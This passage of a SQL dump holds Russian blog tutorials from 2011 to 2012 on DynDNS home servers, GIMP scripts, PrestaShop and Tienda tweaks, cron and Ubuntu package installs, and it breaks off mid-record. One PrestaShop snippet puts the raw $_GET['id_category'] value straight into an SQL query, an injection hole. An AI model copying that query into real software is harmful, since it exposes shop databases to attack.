(40, 'D-Link + домашний сервер на apache', 'd-link-domashnii-siervier-na-apache', '<p>Не так давно задумался о том чтобы такого сделать чтобы можно было бы удобно работать удаленно не смотря на <strong>динамический IP</strong>. Но как всегда все делаем в последний момент, и вот когда уже совсем терпеть больше нельзя было, заставил себя разобраться в этом более подробно. Задача очень проста и тривиальна, не раз обсуждалась. Состоит она в том чтобы настроить видимость своего <strong>локального сервера</strong> (тут подразумевается настроенный веб сервер Apache) из вне, т.е. из интернета. Дабы в любой момент можно было бы обратиться к нему и поработать вдоволь вдали от дома. Хоть как я уже говорил выше, задача проста, все же готового решения в интернете мне найти не удалось. Посему посвящаю этому сей пост. <!--more-->Для начала&nbsp;регистрируемся&nbsp;на сервисе&nbsp;<strong>dyndns.com. </strong>Процесс регистрации стандартный, описывать его не буду. Заходим под своим логином и паролем. Далее идем в My servieces -&gt; MyHosts</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/04/dyndns.jpg" style="width: 500px; height: 296px;" /></p>\r\n\r\n<p>Добавляем новый хост. Указываем имя с расчетом что домен будет выглядеть как &lt;имя&gt;.dyndns.org. <strong>Service Type:</strong> Host with IP address <strong>IP Address</strong>: наш IP адресс на данный момент, по-умолчанию&nbsp;обновляется&nbsp;каждую минуту, но об этом позже. Расставьте&nbsp;теги, если вам не лень, поможете сервису собрать статистику :) Далее нам нужно настроить роутер <strong>D-Link</strong> (у меня <strong>DIR-615</strong>) для работы с сервисом <strong>DynDNS</strong>. По-умолчанию веб-интерфейс доступен по адресу&nbsp;<a href="http://192.168.0.1/">http://192.168.0.1</a> , перейдем на вкладку Advanced и поставим настройки так же как у меня.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/04/dlink-routing.jpg" style="width: 550px; height: 338px;" /></p>\r\n\r\n<p>В поле<strong> IP Adress</strong> укажите внутренний IP компьютера на котором вертится Апач. На всякий случай можно посмотреть в разделе Status</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/04/dlink-status.jpg" style="width: 550px; height: 358px;" /></p>\r\n\r\n<p>Теперь Tools -&gt; Dynamic DNS Выставляем настройки нашего аккаунта</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/04/dlink-dyndns.jpg" style="width: 550px; height: 449px;" /></p>\r\n\r\n<p>Ждем 15-20 минут, и готово. Наш сервер доступен по адресу &lt;host_name&gt;.<strong>dyndns.org</strong>.</p>', '/uploads/2014/02/d-link-domashnii-siervier-na-apache.jpeg', 1, NULL, '2011-04-13 22:13:43'),
(41, 'Делаем, обрабатываем скриншоты в Gimp', 'dielaiem-obrabatyvaiem-skrinshoty-v-gimp', '<p>В этой статье я в&nbsp;вкратце&nbsp;расскажу&nbsp;о том каким образом я делаю скриншоты на сайт. Это будет полезно тем кто <strong>пишет техническую документацию</strong>. Для этого мы напишем пару скриптов для<strong> Gimp</strong> которые упростят нам жизнь. Итак начнем. <!--more-->В этой статье я не буду ходить вокруг да около, тем более что я мало что в этом понимаю, поэтому я дам готовое решение в очень сжатом виде. Для начала создадим скрипт простой урезки углов. Открываем свой любимый редактор, для меня это GEdit, и вставляем туда следующий код:</p>\r\n\r\n<pre lang="scheme">\r\n(define (script-fu-cut-corners 	image\r\n				drawable\r\n				radius\r\n				only-top)\r\n	(gimp-context-push)\r\n	(gimp-image-set-active-layer image drawable)\r\n	(gimp-image-undo-group-start image)\r\n\r\n	; Добавляем альфа-канал (прозрачность)\r\n	(gimp-layer-add-alpha drawable)\r\n	; Выделяем все изображение, cкругляем уголки выделения\r\n	(gimp-round-rect-select image 0 0 (car (gimp-image-width image))\r\n		        (car (gimp-image-height image))\r\n			radius radius CHANNEL-OP-REPLACE TRUE FALSE 0 0)\r\n	; Инвертируем выделение\r\n	(gimp-selection-invert image)\r\n	; Если требуется подрезать только верхние уголки...\r\n	(if (= only-top TRUE)\r\n		; ...то вычитаем из выделения область изображения\r\n		; охватывающую оба нижних уголка\r\n		(gimp-rect-select image\r\n				0\r\n				(- (car (gimp-image-height image)) radius)\r\n				(car (gimp-image-width image))\r\n				radius\r\n				CHANNEL-OP-SUBTRACT\r\n				FALSE\r\n				0))\r\n	; Удаляем выделенные области\r\n	(gimp-edit-clear drawable)\r\n	; Снимаем выделение\r\n	(gimp-selection-none image)\r\n\r\n	(gimp-image-undo-group-end image)\r\n	(gimp-displays-flush)\r\n	(gimp-context-pop)\r\n)\r\n\r\n(script-fu-register &quot;script-fu-cut-corners&quot;\r\n	&quot;Подрезать уголки&quot;\r\n	&quot;Подрезать скругленные уголки скриншота окна.&quot;\r\n	&quot;Василий Пупкин\r\n&quot;\r\n	&quot;ООО Рога и Копыта&quot;\r\n	&quot;2010/10/6&quot;\r\n	&quot;RGB*&quot;\r\n	SF-IMAGE      	&quot;Image&quot;                   	0\r\n	SF-DRAWABLE   	&quot;Drawable&quot;                	0\r\n	SF-ADJUSTMENT 	&quot;Радиус (0 - 20 пикселей)&quot;	&#39;(8 0 20 1 10 0 0)\r\n	SF-TOGGLE	  	&quot;Только верхние&quot;		FALSE\r\n\r\n)\r\n\r\n(script-fu-menu-register &quot;script-fu-cut-corners&quot;\r\n                         &quot;</pre>\r\n\r\n<p><img alt="" /></p>\r\n\r\n<pre lang="scheme">\r\n/Filters/Мои скрипты&quot;)</pre>\r\n\r\n<p>Называйте как хотите :), расширение указвыаем .scm (Например. obrezka-uglov.scm). Сохраняем это добро в папку</p>\r\n\r\n<pre lang="scheme">\r\n/home/&lt;Имя_пользователя&gt;/.gimp-2.6/scripts</pre>\r\n\r\n<p>Или же делаем Переход-&gt;Домашний каталог, если там не находим папку с именем .gimp-2.6 нажимаем Ctrl+H (Вид-&gt;Показывать скрытые файлы), по умолчанию эта папка скрыта. По аналогии делаем следующий скрипт для быстрого создания тени:</p>\r\n\r\n<pre lang="scheme">\r\n(define (script-fu-quick-shadow image drawable)\r\n	(gimp-context-push)\r\n	(gimp-image-set-active-layer image drawable)\r\n	(gimp-image-undo-group-start image)\r\n\r\n	; Вызов стандартной процедуры script-fu-drop-shadow\r\n	(script-fu-drop-shadow image drawable 3 4 10 &#39;(0 0 0) 40 TRUE)   \r\n\r\n	(gimp-image-undo-group-end image)\r\n	(gimp-displays-flush)\r\n	(gimp-context-pop)\r\n)\r\n\r\n(script-fu-register &quot;script-fu-quick-shadow&quot;\r\n	&quot;Быстрая тень&quot;\r\n	&quot;Отбросить тень со стандартными параметрами:\r\n	 смещение по X = 3, по Y = 4, радиус размытия = 10,\r\n	 цвет черный, прозрачность 40%.&quot;\r\n	&quot;Василий Пупкин\r\n&quot;\r\n	&quot;ООО Рога и Копыта&quot;\r\n	&quot;2010/10/6&quot;\r\n	&quot;RGB*&quot;\r\n	SF-IMAGE      &quot;Image&quot;      0\r\n	SF-DRAWABLE   &quot;Drawable&quot;   0\r\n)\r\n\r\n(script-fu-menu-register &quot;script-fu-quick-shadow&quot;\r\n                         &quot;</pre>\r\n\r\n<p><img alt="" /></p>\r\n\r\n<pre lang="scheme">\r\n/Filters/Мои скрипты&quot;\r\n)</pre>\r\n\r\n<p>Теперь можем открыть Gimp (или перезапустить, если он у Вас был запущен до этого) и увидеть свои программки в Фильтры -&gt; Мои скрипты Оригинал статьи <a href="http://habrahabr.ru/company/devexpress/blog/106611/" target="_blank">здесь.</a></p>', '/uploads/2014/02/dielaiem-obrabatyvaiem-skrinshoty-v-gimp.png', 0, NULL, '2012-02-20 21:46:33'),
(42, 'Валюта не по умолчанию для Tienda 0.70', 'valiuta-nie-po-umolchaniiu-dlia-tienda-0-70', '<p>Я так подозреваю что возможность отображать цены во фронтенде в валюте отличной от той что в базе будет в последующих версиях, но все равно опыт интересен, и я по просьбе lmd и по своему хотению решил немного покопаться в коде. Вот что я нарыл... <!--more--> Посмотрев шаблоны вывода цены, обнаружил что за это отвечает метод <strong>dispayPriceWithTax</strong> класса <strong>TiendaHelperProduct</strong> его можно найти по адресу <code>administrator/components/co_tienda/helpers/product.php</code> Выглядит он примерно так:</p>\r\n\r\n<pre>\r\n<code class="php">function dispayPriceWithTax($price=&#39;0&#39;, $tax=&#39;0&#39;, $show=&#39;0&#39;)\r\n    {\r\n     	$txt = &#39;&#39;;\r\n     	if($show &amp;&amp; $tax)\r\n     	{\r\n     		if ($show == &#39;2&#39;)\r\n     		{\r\n     			$txt .= TiendaHelperBase::currency($price + $tax);\r\n			}\r\n			else\r\n			{\r\n				$txt .= TiendaHelperBase::currency($price);\r\n				$txt .= sprintf( JText::_(&#39;INCLUDE_TAX&#39;), TiendaHelperBase::currency($tax));\r\n			}\r\n     	}\r\n     	else\r\n     	{\r\n     		$txt .= TiendaHelperBase::currency($price);\r\n     	}\r\n\r\n     	return $txt;\r\n    }</code></pre>\r\n\r\n<p>Как видим в любом случае (с налогами или без них) цену для нас добывает метод <strong>TiendaHelperBase::currency</strong>. Да прибудет с нами священный поиск... :) Находим его в: <code>administrator/components/co_tienda/helpers/_base.php</code> И вот так он выглядит:</p>\r\n\r\n<pre>\r\n<code class="php">function currency($amount, $currency=&#39;&#39;, $options=&#39;&#39;)\r\n    {\r\n        $currency_helper =&amp; TiendaHelperBase::getInstance( &#39;Currency&#39; );\r\n        $amount = $currency_helper-&gt;_($amount, $currency, $options);\r\n        return $amount;\r\n    }</code></pre>\r\n\r\n<p>Второй параметр <strong>$currency</strong> у нас пуст. По умолчанию дадим ему id валюты в которой мы хотим отображать цены на сайте. Это значение мы возьмем из таблицы валют <strong>tienda_currencies</strong> поле <strong>currency_id</strong>. У меня валютой по умолчанию будет UAH и ее id = 5. Для меня код будет следующим:</p>\r\n\r\n<pre>\r\n<code class="php">function currency($amount, $currency=&#39;5&#39;, $options=&#39;&#39;)\r\n    {\r\n        $currency_helper =&amp; TiendaHelperBase::getInstance( &#39;Currency&#39; );\r\n        $amount = $currency_helper-&gt;_($amount, $currency, $options);\r\n        return $amount;\r\n    }</code></pre>\r\n\r\n<p>&nbsp;</p>', '/uploads/2014/02/valiuta-nie-po-umolchaniiu-dlia-tienda-0-70.jpeg', 1, NULL, '2012-02-20 21:51:00'),
(43, 'Сергей Бабкин - Кот', 'sierghiei-babkin-kot', '<p>[audio:http://cs4673.vkontakte.ru/u13130697/audio/d38ad5b2af23.mp3]</p>', NULL, 0, NULL, '2011-04-14 11:09:12'),
(44, 'Запуск php скрипта по cron в Ubuntu 10.10', 'zapusk-php-skripta-po-cron-v-ubuntu-10-10', '<p>Задача состоит в том чтобы с определенной периодичностью запускать <strong>php </strong>файл. В данном случае скрипт <strong>обновления цен в интернет магазине</strong>. Цены и наличие товара в моем магазине должны обновляться каждый час во избежание всяческих недоразумений когда товар на сайте есть, а в наличии у поставщика нет еще со вчера, или цена изменилась и пр. <!--more--> Несколько слов о <strong>cron</strong> <strong>cron</strong> &mdash; демон-планировщик задач в <strong>UNIX</strong>-подобных операционных системах, использующийся для периодического выполнения заданий в заданное время. Утилита cron выполняет команды в заданное время. Регулярные действия описываются инструкциями, помещенными в файлы <strong>crontab</strong>, которые находятся в каталоге. Как видим ключевое здесь&nbsp;<strong>crontab </strong>именно в этом файле хранятся инструкции по заданиям которые нужно выполнить. Открываем терминал, прописываем:</p>\r\n\r\n<pre>\r\n<code class="bash">crontab -e</code></pre>\r\n\r\n<p>Тем самым откроем в редакторе по умолчанию файл <strong>crontab </strong>для редактирования. У меня это <strong>Vim</strong>. Поэтому нажимаю &quot;i&quot; для редактирования в конце файла добавляю строчку:</p>\r\n\r\n<pre>\r\n<code class="no-highlight">1 * * * * /usr/bin/php5 /var/www/myscript.php</code></pre>\r\n\r\n<p>Вместо /var/www/myscript.php полный путь к Вашему скрипту. Выхожу из редактирования в Vim с помощью Esc, сохраняю ZZ Для того чтобы проверить записались ли изменения в файл, в терминале набираю:</p>\r\n\r\n<pre>\r\n<code class="bash">crontab -l</code></pre>\r\n\r\n<p>Каждая строка в файле <strong>crontab </strong>является исполняемой, для того чтобы задать инструкцию нужно указать 6 полей: минута час день_месяца месяц день_недели команда Допустимые значения:</p>\r\n\r\n<ol>\r\n	<li>минута от 0 до 59</li>\r\n	<li>час от 0 до 23</li>\r\n	<li>день_месяца от 1 до 31</li>\r\n	<li>месяц от 1 до 12 (можно три буквы из названия месяца, регистр не имеет значения от jan до dec)</li>\r\n	<li>день_недели от 0 до 6 (0 это воскресенье, можно писать от sun до sat)</li>\r\n</ol>\r\n\r\n<p><strong>Дополнение 1.</strong> В скрипт не хотел выполнятся по крону, несмотря на успешный запуск в браузере. Проблема оказалась в неполном пути к файлу. Если у Вас есть какие либо пути к файлам, позаботьтесь о том чтобы пути были полными.</p>\r\n\r\n<p><strong>Дополнение 2.</strong> У меня на связке Ubuntu Server + LAMP отказался запускаться скрипт через&nbsp;командную&nbsp;строку из-за отсутствия файла&nbsp;<span>/usr/bin/php5. Решением проблемы стало:</span>&nbsp;</p>\r\n\r\n<pre>\r\n<code class="bash">sudo apt-get install php5-cli </code></pre>\r\n\r\n<p><strong>Дополнение 3.</strong> Отказался работать Image Magick через командную строку. Помогло это:&nbsp;</p>\r\n\r\n<pre>\r\n<code class="bash">sudo apt-get install php5-imagick</code></pre>\r\n\r\n<p>Большое спасибо <strong><a href="http://forum.ubuntu.ru/index.php?action=profile;u=19089">scream4ik</a></strong> с <a href="http://forum.ubuntu.ru">руcскоязычного форума Ubuntu</a></p>', '/uploads/2014/02/zapusk-php-skripta-po-cron-v-ubuntu-10-10.jpeg', 1, NULL, '2011-04-15 06:09:01');
INSERT INTO `articles` (`id`, `title`, `slug`, `text`, `image`, `publish`, `weight`, `created_at`) VALUES
(45, 'Шаблон вывода списка товаров категории Prestashop', 'shablon-vyvoda-spiska-tovarov-katieghorii-prestashop', '<p>Дело в том что при наличии достаточно обширного асортимента товаров стала необходимо разделить товары по различным группам.</p>\r\n\r\n<ol>\r\n	<li>Группа товаров которая отображалась в стандартном виде - Название, картинка, короткое описание, цена, купить</li>\r\n	<li>Группа отображения в виде таблицы - Название, цена, купить.</li>\r\n</ol>\r\n\r\n<p>Вторая группа будет использоватся для товаров для которых не важны ни описание ни внешний вид, таких как - расходные материалы, комплектующие и т. п. <!--more-->Для начала ставим принудительную компиляцию шаблона <strong>Smarty</strong> для того чтобы сразу же видеть изменения которые мы будем вносить в код. Для этого есть 2 способа. Первый. Идем в Админ панель сайта -&gt; Настройки -&gt; Производительность -&gt; <strong>Принудительная компиляция</strong> -&gt; Да Второй. Оставляем Принудительную компиляцию выключенной, идем в /config/smarty.config.inc.php ищем smarty-&gt;compile_check и меняем значение на true. Все теперь <strong>Smarty</strong> будет перекомпилировать только измененные шаблоны. Следующим шагом будет добавление свойства категории с названием <strong>flag_template</strong>. Идем в /classes/<strong>Category.php</strong> и в классе <strong>CategoryCore</strong> объявляем новую переменную, после:</p>\r\n\r\n<pre>\r\n<code class="php">public $date_upd;</code></pre>\r\n\r\n<p>ставляем:</p>\r\n\r\n<pre>\r\n<code class="php">/** @var integer category view template */\r\npublic	 $flag_template;</code></pre>\r\n\r\n<p>Далее инициализируем переменную, находим:</p>\r\n\r\n<pre>\r\n<code class="php">$fields[&#39;date_upd&#39;] = pSQL($this-&gt;date_upd);</code></pre>\r\n\r\n<p>и вставляем после нее:</p>\r\n\r\n<pre>\r\n<code class="php">$fields[&#39;flag_template&#39;] = pSQL($this-&gt;flag_template);</code></pre>\r\n\r\n<p>Теперь у нас переменной<strong> flag_template</strong> будет присвоено значение из базы данных, таблицы _category поле&nbsp;<strong><strong>flag_template</strong></strong>. Нужно создать это поле в базе данных вручную. Я для этих целей использовал <strong>PhpMyAdmin</strong> В файле /themes/prestashop/<strong>category.tpl </strong>находим строку включения списка товаров:</p>\r\n\r\n<pre>\r\n<code class="php">{include file=&quot;$tpl_dir./product-list.tpl&quot; products=$products}</code></pre>\r\n\r\n<p>И заменяем на:</p>\r\n\r\n<pre>\r\n<code>{if $category-&gt;flag_template == 1}\r\n{include file=&quot;$tpl_dir./product-list1.tpl&quot; products=$products}\r\n{else}\r\n{include file=&quot;$tpl_dir./product-list.tpl&quot; products=$products}\r\n{/if}</code></pre>\r\n\r\n<p>Вобщем то на этом можно закончить. Можно вставлять столько условий, сколько будет шаблонов. Каждый из этих шаблонов необходимо будет перевести через админ панель (Инструменты (Tools) -&gt; Переводы(Translation) -&gt; Изменить перевод -&gt; Фронт офис -&gt; Флаг языка (русский? :))- просто скопировав значения из уже переведенного шаблона! После того как я уменьшил почти в 3-и раза высоту блока отображения (class=&quot;ajax_block_product) товара образовалась пустота внизу страницы. Я подумал что неплохо было бы эти товары выводить в большем количестве. Итак, я нашел класс который отвечает за к-во товаров на странице, а также за нумерацию страниц (pagination) - /classes/FrontController.php. Находим в нем <strong>function pagination</strong> и после</p>\r\n\r\n<pre>\r\n<code class="php">if (!self::$initialized)\r\n$this-&gt;init();</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Вставляем:</span></p>\r\n\r\n<pre>\r\n<code class="php">$query = &#39;SELECT `flag_template` FROM `&#39;._DB_PREFIX_.&#39;category` WHERE `id_category` = &#39;.$_GET[&#39;id_category&#39;];\r\n$template = Db::getInstance(_PS_USE_SQL_SLAVE_)-&gt;getValue($query);\r\nif ($template == 1) {$product_per_page = 30;}\r\nelse {$product_per_page = Configuration::get(&#39;PS_PRODUCTS_PER_PAGE&#39;);}</code></pre>\r\n\r\n<p><span style="line-height: 1.6em;">Далее по тексту ф-ции отслеживаем выражение </span><em style="line-height: 1.6em;">Configuration::get(&#39;PS_PRODUCTS_PER_PAGE&#39;)</em><span style="line-height: 1.6em;"> и наменяем его на </span><em style="line-height: 1.6em;">$product_per_page</em><span style="line-height: 1.6em;"> Огромное спасибо за хорошую подсказку </span><a href="http://www.prestashop.com/forums/member/80483/sors/" style="line-height: 1.6em;"><strong>Sors-у</strong></a><span style="line-height: 1.6em;"> из русского сообщества </span><strong style="line-height: 1.6em;">Prestashop</strong><span style="line-height: 1.6em;">, без него я бы еще б неделю рыл код. З.Ы.: по просьбе Виталия выкладываю скрины как это выглядит на моем сайте. </span><strong style="line-height: 1.6em;">Это стандартный шаблон:</strong></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/08/product_list1.jpg" style="width: 565px; height: 549px;" /></p>\r\n\r\n<p><strong>Модифицированный шаблон:</strong></p>\r\n\r\n<p><strong><img alt="" class="img-responsive" src="/uploads/2011/08/product_list2.jpg" style="width: 566px; height: 481px;" /></strong></p>', '/uploads/2014/02/shablon-vyvoda-spiska-tovarov-katieghorii-prestashop.jpeg', 1, NULL, '2011-05-27 16:11:38'),
(46, 'Как хранить картинки товаров у себя на компьютере для магазина Prestashop', 'kak-khranit-kartinki-tovarov-u-siebia-na-komp-iutierie-dlia-maghazina-prestashop', '<p>У меня пока-что магазин вертится на шаред хостинге, то ли от недостатка уверенности что все получится, то ли от недостатка начального капитала :), к тому же Presta отлично ворочается на виртуальном хостинге, в отличии от Tienda Места у меня всего 500 Мб а картинок на 3Гб, и так как на домашнем сервере я все равно тестурую сайт я решил что пока не заимею свой сервачок, или хотябы не решусь на VDS, буду картинки хранить у себя, благо у мой сервер доступен из сети интернет 24/7. О том как это сделать <a href="http://kotoblog.pp.ua/ubuntu/d-link-domashnij-server-na-apache.html">читайте в моей предыдущей статье.</a> Для этого пришлось сделать не сложную модификацию класса... <!--more--> Файл /classes/Link.php там находим класс getImageLink:</p>\r\n\r\n<pre>\r\n<code class="php">public function getImageLink($name, $ids, $type = NULL)\r\n{\r\n    global $protocol_content;\r\n    if ($this-&gt;allow == 1)\r\n        $uri_path = __PS_BASE_URI__.$ids.($type ? &#39;-&#39;.$type : &#39;&#39;).&#39;/&#39;.$name.&#39;.jpg&#39;;\r\n    else\r\n        $uri_path = _THEME_PROD_DIR_.$ids.($type ? &#39;-&#39;.$type : &#39;&#39;).&#39;.jpg&#39;;\r\n    return $protocol_content.Tools::getMediaServer($uri_path).$uri_path;\r\n}</code></pre>\r\n\r\n<p>В первом случае мы получаем ссылку с включенным ЧПУ во втором с выключенным. Для того чтобы создать ссылку на картинку на своем сервере я изменил класс следующим образом:</p>\r\n\r\n<pre>\r\n<code class="php">public function getImageLink($name, $ids, $type = NULL)\r\n{\r\n    global $protocol_content;\r\n    if ($this-&gt;allow == 1)\r\n        $uri_path = __PS_BASE_URI__.$ids.($type ? &#39;-&#39;.$type : &#39;&#39;).&#39;/&#39;.$name.&#39;.jpg&#39;;\r\n    else\r\n        $uri_path = &#39;http://MYDOMEN.dyndns.org/presta/img/p/&#39;.$ids.($type ? &#39;-&#39;.$type : &#39;&#39;).&#39;.jpg&#39;;\r\n    return $uri_path;\r\n}</code></pre>\r\n\r\n<p>Не забудьте выключить ЧПУ, или модифицировать для себя, и заменить http://MYDOMEN.dyndns.org на свой.</p>', '/uploads/2014/02/kak-khranit-kartinki-tovarov-u-siebia-na-komp-iutierie-dlia-maghazina-prestashop.jpeg', 1, NULL, '2011-06-05 08:46:54'),
(47, 'PrestaShop полезные мелочи', 'prestashop-polieznyie-mielochi', '<p>Здесь немного практических полезных примеров при разработке сайта на PrestaShop. <!--more--> Получаем <strong>массив всех категорий</strong> из БД:</p>\r\n\r\n<pre>\r\n<code class="php">$categories = Category::getCategories((int)($cookie-&gt;id_lang), false);</code></pre>\r\n\r\n<p>Получаем <strong>массив категорий</strong> к которым пренадлежит продукт с ИД в запросе (GET or POST):</p>\r\n\r\n<pre>\r\n<code class="php">Product::getProductCategories((int)Tools::getValue(&#39;id_product&#39;));</code></pre>\r\n\r\n<p>&nbsp;</p>', NULL, 1, NULL, '2011-08-13 23:32:51'),
(48, 'Создание скриншотов в Windows', 'sozdaniie-skrinshotov-v-windows', '<p>На днях мне потребовался быстрый и удобный способ снятия <strong>скриншотов </strong>(<strong>screenshot</strong>) в ОС <strong>Windows</strong>. После неудачных попыток найти что-либо достойное и бесплатное в Гугл (либо регистрация либо платно) я направился на <strong>http://sourceforge.net/</strong> Где как не там можно найти <strong>бесплатный open source </strong>софт. Но оказалось что программ с функцией <strong>ресайза</strong>(от <strong>resize </strong>- изменения размера) картинок нет. В лучшем случае программы могут вырезать, ретушировать и накладывать текст, но при этом они сложны и наворочены по самое немогу (взять хотябы <strong>Zscreen </strong>- наглядный пример как на базе простой задачи можно построить сложнейшую систему). Поэтому в продолжении я хотел бы поделится довольно простым решением, возможно кому-то пригодится. <!--more-->Первая программа которая мне понадобится называется <a href="http://sourceforge.net/projects/lightscreen/" target="_blank"><strong>Lightscreen</strong></a>. Она поможет нам очень просто сделать <strong>скриншот выбранной части экрана</strong>. Качайте, устанавливайте и да прибудет с Вами сила. Вторая программа <a href="http://sourceforge.net/projects/phototoysclone/" target="_blank"><strong>Image Resizer</strong></a> поможет нам изменить размер. Качайте, устанавливайте, запускайте &quot;Пуск-&gt;Программы-&gt;<strong>Lightscreen</strong>&quot; 1. Нажимаем &quot;<strong>Скриншот</strong>-&gt;Область&quot;.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/08/screenshot.jpg" style="width: 179px; height: 198px;" /></p>\r\n\r\n<p>2. Выделяем нужную нам область экрана</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/08/screenshot2.jpg" style="width: 550px; height: 439px;" /></p>\r\n\r\n<p>3. Находим наш скриншот по адресу &quot;Мои документы -&gt; <strong>Screenshots</strong>&quot; 4. Жмем правой клавишей на нашем изображении -&gt; <strong>Resize Picture</strong></p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/08/screenshot3.jpg" style="width: 700px; height: 527px;" /></p>\r\n\r\n<p>5.&nbsp; Здесь нужно будет поэксперементировать с параметрами если не устраивают предустановленные настройки.</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/08/screenshot4.jpg" style="width: 421px; height: 302px;" /></p>\r\n\r\n<p>На этом все. Программа создаст для Вас <strong>копию изображения с выбраными параметрами</strong>. Теперь <strong>скриншот </strong>можно будет использовать в благих целях, чего я Вам искренне и желаю.</p>', '/uploads/2014/02/sozdaniie-skrinshotov-v-windows.png', 1, NULL, '2011-08-17 01:46:57'),
(49, 'cURL + PHP5 + Ubuntu правильная установка', 'curl-php5-ubuntu-pravil-naia-ustanovka', '<div class="alert alert-warning">Внимание! Данная инструкция приминима к 10.10.<br />\r\nДля 12.04 используйте <a href="/articles/ustanovka-curl-ubuntu-12-04">Установка cUrl на Ubuntu 12.04</a></div>\r\n\r\n<p>Уже в который раз наступаю на одни и теже грабли. В сети полно мануалов по установке&nbsp;<strong>cURL + PHP5 + Ubuntu</strong> но они все неправильные. Вот как устанавливаю я:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo apt-get install curl libcurl3 libcurl3-dev php5-curl php5-mcrypt</code></pre>\r\n\r\n<p>После этого в конец файла <strong>php.ini</strong> (у меня по адресу <strong>/etc/php5/apache2/php.ini</strong>) вводим следующее:</p>\r\n\r\n<pre>\r\n<code class="ini">;cUrl\r\nextension=/usr/lib/php5/20090626/curl.so</code></pre>\r\n\r\n<p>естественно что путь к файлу <strong>curl.so</strong> у Вас может отличатся - я свой нашел через поиск. Теперь перезагружаем<strong> веб сервер</strong>:</p>\r\n\r\n<pre>\r\n<code class="bash">/etc/init.d/apache2 restart</code></pre>\r\n\r\n<p>Все. Заходите в phpinfo вашего сервера и наблюдайте такую картину:</p>\r\n\r\n<p><img alt="" class="img-responsive" src="/uploads/2011/10/curl.jpg" style="width: 544px; height: 860px;" /></p>\r\n\r\n<p>Теперь можете использовать &nbsp;&nbsp;<strong>cURL + PHP5 + Ubuntu </strong>в свое удовольствие! :)</p>', NULL, 1, NULL, '2011-10-15 20:57:13'),
(50, 'Ubuntu LightScribe на AMD64', 'ubuntu-lightscribe-na-amd64', '<p>Поздравляю всех с наступившим 2012 Новым Годом. Как всегда в этом году я делал подарки ввиде красивых <strong>LightScribe</strong> дисков, и как всегда откладывал это в долгий ящик. Т.к. у меня в 2011 появился ковый комп на базе процессора <strong>AMD64</strong>, которым я к стати очень доволен, то процес установки <strong>LightScvribe</strong> приложения будет немного отличатся нежели для 32 битных систем. Итак приступим...<!--more--> Первое что мы делаем &nbsp;- это открываем консоль и вписываем:</p>\r\n\r\n<pre><code class="bash">apt-get install ia32-libs apt-get install alien</code></pre>\r\n\r\n<p>Если вдруг мы еще не устанавливали чуждые для <strong>64</strong> битных систем <strong>32</strong>-х битные приложения, эти библиотеки нам очень пригодятся.</p>\r\n\r\n<pre><code class="bash">apt-get install libstdc++5 </code></pre>\r\n\r\n<p>Устаревшая библиотека <strong>libstdc++5</strong> понадобится в дальнейшем для работы нашего приложения. Теперь скачаем приложения для рисовалки дисков <strong>LightScribe</strong>:</p>\r\n\r\n<pre><code class="bash">wget http://download.lightscribe.com/ls/lightscribe-1.18.24.1-linux-2.6-intel.deb \r\nwget http://www.lacie.com/download/drivers/4L-1.0-r6.i586.rpm</code></pre>\r\n\r\n<p>Пожалуйста, обратите внимание что версия первого пакета может отличатся от той что у меня - можете уточнить актуальную версию на <a href="http://lightscribe.com/" target="_blank" title="Официальный сайт LightScribe">официальном сайте</a>, там же можете и скачать. Оба пакета, по большому счету нам не подходят, поэтому установка и отличается:</p>\r\n\r\n<pre><code class="bash">dpkg -i --force-all lightscribe-1.18.24.1-linux-2.6-intel.deb</code></pre>\r\n\r\n<p>Не забудьте по версию пакета! Теперь преобразовуем rpm в tar/gzip</p>\r\n\r\n<pre><code class="bash">alien -t 4L-1.0-r6.i586.rpm</code></pre>\r\n\r\n<p>Теперь в .deb</p>\r\n\r\n<pre><code class="bash">alien 4L-1.0.tgz</code></pre>\r\n\r\n<p>Устанавливаем</p>\r\n\r\n<pre><code class="bash">dpkg -i 4l_1.0-2_all.deb</code></pre>\r\n\r\n<p>Запускаем</p>\r\n\r\n<pre><code class="bash">4L-gui</code></pre>\r\n\r\n<p>После всего выше перечисленного, приложение запустилось но работать отказалось, т.к. не определило привод - ошибка <strong>No drives have been selected</strong>. На просторах интернета нашлось простое решение. Приложение ищет нужные ей библиотеки только в папке <strong>lib32</strong>, поэтому нужно создать символьные ссылки, или просто скопировать недостающие библиотеки, например так:</p>\r\n\r\n<pre><code class="bash">ln -s /usr/lib/liblightscribe.so.1 /usr/lib32/liblightscribe.so.1</code></pre>\r\n\r\n<p>или так, как в моем случае:</p>\r\n\r\n<pre><code class="bash">sudo ln -s /usr/lib/libstdc++.so.5 /usr/lib32/libstdc++.so.5</code></pre>\r\n\r\n<p>Ошибку которую возникает вы можете подсмотреть в консоли с которой запускали приложение. На этом все :)</p>', '/uploads/2014/02/ubuntu-lightscribe-na-amd64.jpeg', 1, NULL, '2012-01-02 10:56:05'),
(51, 'Проблема с установкой sqlite в Ubuntu 10.04', 'probliema-s-ustanovkoi-sqlite-v-ubuntu-10-04', '<p>На самом деле задача достаточно простая и я не знаю почему для меня она оказалась такой сложной. Суть проблемы в том что несмотря на то что я установил все возможные пакеты из репозитория касательно <strong>SQLite</strong> и даже явно прописал <strong>php.ini</strong>, поддержка БД не высвечивалась на phpinfo(). Проведя несколько часов поиска в интернете решение было найдено такое же простое как и проблема :) <strong>UPD.</strong> Рецепт от <a href="http://yakimoff.ru/" rel="external nofollow" target="_blank">Павла Якимова</a>, на работоспособность не проверялся, но имеет смысл попробовать:</p>\r\n\r\n<pre>\r\n<code class="bash">sudo service apache2 reload</code></pre>\r\n\r\n<p>Если ничего не вышло то пробуем следущее - нужно снести все и заново установить:</p>\r\n\r\n<pre>\r\n<code class="bash">apt-get --purge remove php5*\r\nsudo apt-get install php5 php5-sqlite php5-mysql\r\nsudo apt-get install php-pear php-apc php5-curl\r\nsudo apt-get autoremove</code></pre>\r\n\r\n<p>&nbsp;</p>', 